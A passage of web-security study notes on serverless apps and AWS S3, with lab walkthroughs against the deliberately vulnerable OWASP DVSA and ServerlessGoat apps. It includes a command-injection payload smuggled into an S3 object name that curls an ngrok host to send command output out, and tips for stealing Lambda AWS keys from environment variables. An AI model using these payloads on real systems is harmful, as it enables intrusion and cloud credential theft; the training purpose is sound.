the services needed.</li></ul><h3 id="6fe38af4-a3af-4c03-a147-43d9e7317bfa" class=""><strong>Serverless Applications</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#serverless-applications"></a></strong></h3><p id="1492b245-ac44-4bd4-aed0-c5c13dd39131" class="">Function as a Services (FaaS) - Are serverless applications, usually code functions , running in a cloud environment. This cloud environment and the application attack is managed by the cloud operator. As a result, it has the advantage of avoiding the complexity of building and maintaining the infrastructure typically associated with developing and launching an app.</p><ul id="17817bb6-0689-439b-970c-621bdc87aa1e" class="bulleted-list"><li style="list-style-type:disc">Serverless applications have some limitations to be aware of, the execution time is limited to a few minutes, threads, usable disk space and ram are also limitations and there is the need of a trigger/event to run the app and a routing method or API gateway.</li></ul><blockquote id="3e368004-db66-4ad6-8c7c-b252226df7c5" class="">With this limitations in mind, serverless applications are not the best option For resources demanding jobs or tasks that need more than 10 minutes of execution.</blockquote><h3 id="dc6a2e9c-9a13-4f64-a15a-6e55c89df771" class=""><strong>Details of Serverless Architecture</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#details-of-serverless-architecture"></a></strong></h3><ul id="e1c27ea8-3e5c-42c0-8da3-ff0a310a03a9" class="bulleted-list"><li style="list-style-type:disc"><strong>API Routing</strong>: Routing layer calling the application based on the URL association, rules and paramaters. They make the functions to be reached from the internet.</li></ul><p id="2615c90b-02f2-4e6c-8040-3ad28e166603" class="">In AWS its called API Gateway.</p><ul id="32ed98ab-5530-4981-9dd0-286d1333714a" class="bulleted-list"><li style="list-style-type:disc"><strong>State</strong>: As mentioned before, the lifespan of a function is no more than a few minutes, For this reason there is no local cache that can be used and vulnerabilities like file command injections or file uploads are exploited in a different way due to this facts.</li></ul><ul id="20e0ad99-5f08-4953-9d8d-2f1f0e34ac23" class="bulleted-list"><li style="list-style-type:disc"><strong>Cold Start</strong>: As the lifespan is limited, when the code has not been executed in a while or For the first time, it needs to be downloaded, containerized, booted, and primed to be run. This can be solved using 3rd party plugins like:</li></ul><p id="b55adf21-cf7b-4a48-9cfa-732d96d811f4" class="">→ http://github.com/Fidellimited/serverless-plugin-warmup</p><ul id="48a0e4e0-9a3d-4f35-8ef5-551d0cb36396" class="bulleted-list"><li style="list-style-type:disc"><strong>Debugging</strong>: Having the benefit of not managing the infrastructure means there are limitations with debugging due to the lack of access to logs. Instead of logging, another approaches such as printing variables or local lambda are usually put in practice For debugging applications.</li></ul><ul id="fafddbd2-5d0a-41ff-a317-1b104dee3c60" class="bulleted-list"><li style="list-style-type:disc"><strong>No Ops</strong>: Limited sysadmin tasks as the environment is managed by the cloud operator. Backups, security monitoring and logging its still necessary.</li></ul><ul id="4d27fcdf-5dec-473f-bcfc-eaf2bff1339e" class="bulleted-list"><li style="list-style-type:disc">With microservices and serverless apps there are some changes related to security. Network security changes drastically as the security model of functions does not rely on IP addresses and ports. Instead, they share the same external IP address and there are no local network restriction For them inside the host.</li></ul><blockquote id="59df343b-a2c1-42e0-a11d-c5401da229e3" class="">Although network restrictions are barely used, in order to apply restrictions cloud provided access controls and permissions are used.</blockquote><h3 id="af6d6ec4-3a21-4cde-bcb0-a69ff3291aa1" class=""><strong>Serverless Application Example</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#serverless-application-example"></a></strong></h3><p id="4f556914-dde0-42be-b23c-e4edfdcf6a0c" class="">AWS account is necessary FOr this test</p><ul id="52fd6aff-4a40-48d7-9109-eafbac11cdd3" class="bulleted-list"><li style="list-style-type:disc">https://github.com/OWASP/DVSA</li></ul><p id="3392c1ca-5db9-4243-ae34-5c1047b4709b" class="">Go to <strong>https://aws.amazon.com/lambda</strong> to start creating a function:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="57ae83a9-95de-4d78-bb0e-4243c666be51" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1. Go to lambda, create application
+2. Other Options
+3. Browser Serverless app repository
+4. Mark the option &quot;Show apps that create custom IAM roles or resource policies&quot;
+5. Search DVSA
+</code></pre><p id="433c39e9-a6e3-4a0b-a898-e46e2f2bfb1f" class="">Go to the AWS System Manager, Parameter Store and look For the DVSA URL</p><ul id="fbdbeaf2-418d-4308-be8b-b0c7a49c4e74" class="bulleted-list"><li style="list-style-type:disc">Now head to the URL and register an account. It should be a real email For receiving the activation code.</li></ul><blockquote id="d506674c-8fc2-4695-a371-bcea5b270980" class="">The application has been deployed and we will come back to it later. Remember to delete resources once you finish working with them.</blockquote><h3 id="893a449d-b203-4d91-86ad-a4b537b552d0" class=""><strong>S3 Buckets</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#s3-buckets"></a></strong></h3><p id="e5eb691d-bdaf-4ab4-9964-0b2a15c1ef17" class="">Simple Storage Service (S3) is an AWS scalable and distributed file system. These filesystem root folder are referred as buckets while everything else (files, subfolders) are referred as objects. Misconfigured S3 buckets have been the principal cause of many information leaks and attacks against organizations.</p><p id="3e3480ec-da91-476c-9298-9a6a8248464e" class="">Lets create a new S3 bucket:</p><ul id="cf210d10-eabe-499b-8bd4-f80b17b4778b" class="bulleted-list"><li style="list-style-type:disc">While creating buckets, there are several configuration options that can be selected in the process.</li></ul><ul id="8ec13d35-8ea2-48a1-8c37-160345229b51" class="bulleted-list"><li style="list-style-type:disc">Access control and encryption can be specified at this stage.</li></ul><ul id="cc4c7210-1fe3-402a-bc91-c758ec99d21f" class="bulleted-list"><li style="list-style-type:disc">Common S3 attacks consists in unauthorized access to objects. There attacks often gives the capability of modifying and creating new objects and changing existing policies and permissions on S3 buckets.</li></ul><h3 id="52e2c68a-2aca-4874-86b7-b0fd6ff2bfde" class=""><strong>Tool: S3Recon</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#tool-s3recon"></a></strong></h3><ul id="8082767c-f499-42d7-bd39-82a63278556e" class="bulleted-list"><li style="list-style-type:disc">https://github.com/clarketm/s3recon</li></ul><p id="ae13b08c-d066-4f42-952f-ad4df875b1cf" class="">Automating the discovery of misconfigured buckets can be done using S3Recon.</p><p id="ece508dd-2b03-4477-85cd-4d18dfa5ce89" class=""><strong>Python-pip</strong> can be used to install S3Recon, although you might be aware of missing dependencies during the process and install them too.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d84ff4f0-eb20-4491-b84c-180e8af4b3bb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">pip install s3recon
+</code></pre><p id="36fe98b5-6e49-4cad-a44d-09e83b579194" class="">S3Recon needs a wordlist, there is one in the Github repository or a personalized one can be created based on your needs. At this moment the one from the repository will be used.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a550f6ed-731d-45dc-a501-a1658c45ccf8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl -sSfL -o &quot;word-list.txt&quot; &quot;https://raw.githubusercontent.com/clarketm/s3recon/master/data/words.txt&quot;
+</code></pre><p id="08866b41-7e04-4f71-aa68-1e120b184ce4" class="">Running S3 Recon with the worslist file can be done with:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ed64a68a-512b-446b-b6fd-7bfe8c2e8c7d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">s3recon &quot;word-list.txt&quot; -o &quot;results.json&quot; --public
+</code></pre><p id="4db1b6c3-e054-45e1-976c-92d76952dad2" class="">Buckets marked as <strong>public</strong> could give access to restricted content. Objects could be accessed via aws-cli.</p><blockquote id="fa49ff59-a421-463f-bef9-e0c9e5ffc2d3" class="">S3Recon can be integrated with MongoDB For scraping large results. This proves useful in bug bounty programs where any assets belonging to the company are within the scope.</blockquote><h3 id="32d7dc12-a7aa-4882-a855-ce08519a7340" class=""><strong>Reports from hackerone related to S3 misconfigs</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#reports-from-hackerone-related-to-s3-misconfigs"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ac1d390f-e579-4410-9f42-db455382703d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://hackerone.com/reports/631529
+- https://hackerone.com/reports/507097
+- https://hackerone.com/reports/504600
+- https://hackerone.com/reports/209223
+</code></pre><h3 id="cf4c2c92-73f9-43bd-a49d-345cbba2cae9" class=""><strong>AWS Signed URLs</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#aws-signed-urls"></a></strong></h3><p id="477378b7-5f49-4b3c-b67c-652860c2602e" class="">It can be used to give objects temporary access. Any user having this URL will be able to download the object For a limited time. They are commonly used by streaming providers.</p><ul id="2afd77f5-e3e1-4cfa-816f-0d15a58693ea" class="bulleted-list"><li style="list-style-type:disc">Create a private bucket and add some files to it.</li></ul><ul id="303a0a4b-7b7a-410e-ad19-632e57d1371a" class="bulleted-list"><li style="list-style-type:disc">When trying to reach any off these URLs, an <strong>AccessDenied</strong> error will appear because the bucket has been set as private.</li></ul><ul id="9d5c1b0b-56bd-4d77-8742-a41733364046" class="bulleted-list"><li style="list-style-type:disc">Using aws-cli, u should be able to access these objects once it has been configured via <strong>aws-cli configure</strong> command.</li></ul><p id="39883c14-806d-4bf6-888b-06fd004a03e2" class="">Files can be copied using</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="544506f2-a030-49c7-8c5f-c8370d2c4fd1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">aws-cli cp &lt;S3URI&gt; &lt;LOCALPATH&gt;
+</code></pre><h3 id="ef162b6f-3321-4cc4-ae63-e2a6053634f3" class=""><strong>Creating Signed URLs</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#creating-signed-urls"></a></strong></h3><p id="0bed2a02-ffce-4c40-824a-9e8dbe635a50" class="">Signed URLs can be generated using boto3 library For python</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="980c9d66-456f-4737-8e24-a88cc2a68246" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">pip install boto3
+</code></pre><p id="2a9de413-3bb7-4f80-8b21-98769d0fe02a" class="">Visiting the Signed URL shows the object contents.</p><ul id="56f420bc-0da1-4dab-a875-db2a7ac7eafc" class="bulleted-list"><li style="list-style-type:disc">Signed URLs gives access to a single file. This method it does not scale when access to a set of objects is needed.</li></ul><ul id="b55dd1c7-52ff-43ee-9bc8-3a0a13d15c0f" class="bulleted-list"><li style="list-style-type:disc">For this reason signed cookies can be used to give access to more than one object at a time.</li></ul><h3 id="9487561d-2cc0-443a-9e47-2bbbce8c6b11" class=""><strong>Serverless Event Injection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#serverless-event-injection"></a></strong></h3><p id="2c72ce9c-05dd-4f82-b7dd-db61ed833fb2" class="">Serverless functions listen For events or triggers in order to be executed. These events can be injected from other trusted sources in cloud environments leading to a Serverless Event Injection vulnerability. These trusted sources can be:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b9f9469a-3a33-4598-bdeb-f40fde215a06" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Actions on S3 Objects
+- Alerting Systems (CloudWatch)
+- API Gateway Calls
+- Changes in the code repository
+- Database events
+- HTTP APIs
+</code></pre><p id="6aceba0b-2429-4832-bbbc-2e97d9a86858" class="">Some serverless functions runs shell or eval content with unstrusted input. For instance, imagine a function with the previous example where the S3 URIs are user controlled.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fffe056d-2375-429c-a267-69a07ab5a872" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&quot;os.system(&quot;aws S3 cp {0} {1} &quot;.format(src_object,dst_object))&quot;
+</code></pre><blockquote id="38aa771e-8bba-49a6-8220-d4d3fc05c82e" class="">If we are able to control any of these variables a command injection vuln changing the name of the filename.</blockquote><h3 id="e7db961b-d055-4adb-84e6-9b58ce6ae4e7" class=""><strong>Serverless Event Injection Scenario</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#serverless-event-injection-scenario"></a></strong></h3><p id="f959f547-ec98-45e0-92d7-950006269897" class="">Remember that serverless functions live For a limited times. This is because they are executed in a small server that lives For a few minutes, this means regular vulnerabilities can exist but only For the time the server is alive.</p><p id="9e53effd-9159-48eb-ba06-012a86f1f85d" class="">The application converts Word doc files to text. It takes an URL (default one supplied) and outputs its contents on the screen.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="74f4d867-9331-41d6-83b9-1795326715df" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">OWASP ServerlessGoat
+</code></pre><ul id="21f00fe3-c77c-4d9b-96df-534e27e9d037" class="bulleted-list"><li style="list-style-type:disc">The function gets invoked by an AWS API Gateway Call. We can observe how the command is issued by crashing the application.</li></ul><ul id="69f6777b-0d2d-4448-bde7-cbaaade6c9b5" class="bulleted-list"><li style="list-style-type:disc">Observing the API Gateway configuration we can understand that this endpoint works as a Lambda Proxy, when the serverless functions receives the event from the proxy it gets invoked.</li></ul><p id="f42bf40a-a50f-4513-9f0d-82f37b8e8275" class="">As we have seen the vulnerable code and where the injection takes place. Try injecting some commands</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="52e83d25-5c14-4505-a068-9a6d0d3e04e0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">* use **&gt;/dev/null** after the document URL to receive a clean output
+</code></pre><ul id="ec3fde65-d84e-4bc9-aa09-6e5c60930480" class="bulleted-list"><li style="list-style-type:disc">As the server will be recycled due to its limited life, there is no point on trying to backdoor it.</li></ul><blockquote id="e30ce15c-b9fc-44c0-a478-95570a6d740f" class="">However, lambda functions store AWS keys in environment variables. They could be reached using env or cat /proc/self/environ</blockquote><h3 id="421bb1fc-b132-4582-ae7a-58d774055e3d" class=""><strong>Serverless Event Injection Scenario 2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#serverless-event-injection-scenario-2"></a></strong></h3><p id="2aae2bd5-b983-4194-b20f-5ee8b1821fde" class="">Back to <strong>Damn Vuln Serverless application</strong> installed before in order to discover more events that can be injected</p><ul id="c338b15f-8d9c-48f9-949d-ce423cfdda29" class="bulleted-list"><li style="list-style-type:disc">Visit the URL and add some elements to the cart</li></ul><ul id="68b7ce27-dd1a-4831-b50e-b70d21c90d21" class="bulleted-list"><li style="list-style-type:disc">Enter random details in the shipping information and submit them in order to receive the receipt.</li></ul><ul id="9eb42f01-f109-4445-af98-86a9c1211cfc" class="bulleted-list"><li style="list-style-type:disc">If you take a look to the message of the order, it will contain an S3 bucket with an UUID For the order receipt</li></ul><ul id="52ff6b0a-00d8-413c-ab24-be34b656e519" class="bulleted-list"><li style="list-style-type:disc">It seems the receipt is being copied from an S3 bucket folder generated using the receipts date and UUID.</li></ul><p id="d15d38e8-6417-4633-9281-d93d26922677" class="">This bucket permissions are relatively open, as uploading files is allowed via:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bbc79674-6f65-493b-a4e7-a51831013552" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&quot;echo &quot;blah&quot;&gt;file.txt &amp;&amp; aws s3 cp file.txt &#x27;s3://&lt;BUCKET&gt;/2020/20/20/whatever&#x27; -acl public-read&quot;
+</code></pre><p id="5f54d31b-ffde-4c12-aea6-a1dc288f4db6" class="">It has been confirmed that the S3 bucket is open For read/write to everyone. Lets check the code in:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d57220ac-b8e5-4a5f-9a20-681f0e2789ac" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://github.com/OWASP/DVSA/blob/master/backend/src/functions/processing/send_receipt_email.py
+</code></pre><p id="c46b4c03-f105-4276-b85d-313a48bf00c1" class="">The event handler is reading the bucket name, key and order, then the function replaces the extension <strong>.raw</strong> by <strong>.txt</strong> meaning they expect a raw S3 Object. Then a download path is created and recorded into a log file using <strong>os.system</strong></p><blockquote id="8e258dff-dcc2-45e9-b183-75f0273523ea" class="">I have prints with this examples, but the quality is not great. So im not gonna post it</blockquote><ul id="a84235b7-9c98-4cee-b70f-2f6b1480b801" class="bulleted-list"><li style="list-style-type:disc">As in the previous example, the app pass to the os.system function some content that we can control as the S3 Bucket permissions are weak.</li></ul><ul id="e43d475a-751c-465c-83a0-90f9f2db6460" class="bulleted-list"><li style="list-style-type:disc">Folowwing the name convention that the function expects a OS Command Injection payload can be uploaded and executed using the S3 AWS API.</li></ul><p id="c08236a7-c30a-435e-b27b-a1618f87d840" class=""><strong>Ngrok</strong> - https://ngrok.com/</p><ul id="12914256-e993-4ee2-bf02-0478ce276fc7" class="bulleted-list"><li style="list-style-type:disc">Ngrok will be used to expose local ports to the internet and catch a reverse shell For this exercise. Visit the website https://ngrok.com and register an account.</li></ul><ul id="7f3df56b-d12d-481b-8f46-82541a109f6c" class="bulleted-list"><li style="list-style-type:disc">After the account has been created, download the ngrok client For your OS and authorize it following the instructions under <strong>connect your account</strong></li></ul><ul id="1a999fb3-2fc9-4b79-a8d8-3bc369a10dbd" class="bulleted-list"><li style="list-style-type:disc">Once the account has been set up you can expose a local port to the internet running <strong>ngrok http 80</strong> and taking note of the URL.</li></ul><p id="d3e2d4dc-8471-4612-89e6-dac52041c137" class="">Requests received to port 80 can be checked on the local web interface</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e05b6a86-3043-4319-8350-3d5727c64a15" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://127.0.0.1:4040
+</code></pre><ul id="efe821fd-b318-43f9-8a03-ce1e6a73049d" class="bulleted-list"><li style="list-style-type:disc">Now, using the same naming convention as the function expects, a payload can be crafted to achieve RCE and receive the response back to our exposed interface.</li></ul><p id="189387e5-e7b2-4388-8218-09e377102d6a" class="">Payload:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="99100274-a066-48fc-bf66-1b098d151b14" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">aws s3 cp empty.txt
+s3://&lt;your bucket id&gt;/2020/20/20/whatever_;curl XXX.grok.io?data=&quot;$(whoami)&quot;;echo x.raw -acl public-read
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a70759a3-6f18-436d-93fb-9dad44b93578" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">whatever_; # it checks For an underscore in the file name
+Curl something.ngrok.io # THe ngrok endpoint to send the output
+&quot;$(whoami)&quot;; # the command to run
+Echo x.raw # needs to end in .raw to be triggered
+</code></pre><ul id="02e168b8-62ad-41ca-8773-85bd423a53d3" class="bulleted-list"><li style="list-style-type:disc">WIth everything in place go and check the Ngrok web interface to check that there are some requests.</li></ul><table id="04139d49-96e9-4620-b5f6-02e73511f707" class="simple-table"><tbody><tr id="6e217749-cbf9-446d-bc1f-b19f8e0e2f8d"><td id="~Qwm" class="">Commands that return a multiline response will not go through as they will break the payload. However, they can be base64 encoded without breaking the lines using **$(ls -lha</td><td id="QNmp" class="">base64 -w0)** in the payload</td></tr></tbody></table><ul id="ef49f599-f2aa-4911-9c14-15c1de2416ab" class="bulleted-list"><li style="list-style-type:disc">Ngrok will now receive the requests that can be decoded to get the command output</li></ul><ul id="ca275935-c592-4e20-b3cd-d3e69a31495b" class="bulleted-list"><li style="list-style-type:disc">If you output the <strong>env</strong> command result, it will include the AWS keys used by the lambda functions. As a result they will have the same privileges they are given and used with the API.</li></ul><ul id="1b1a428a-3a4b-44ec-b2bd-6f24253afc88" class="bulleted-list"><li style="list-style-type:disc">At this point DVSA stack can be deleted from the CloudFormation AWS Service and the S3 Buckets</li></ul><h3 id="551876d0-840d-4097-8187-536637f27b44" class=""><strong>GraphQL 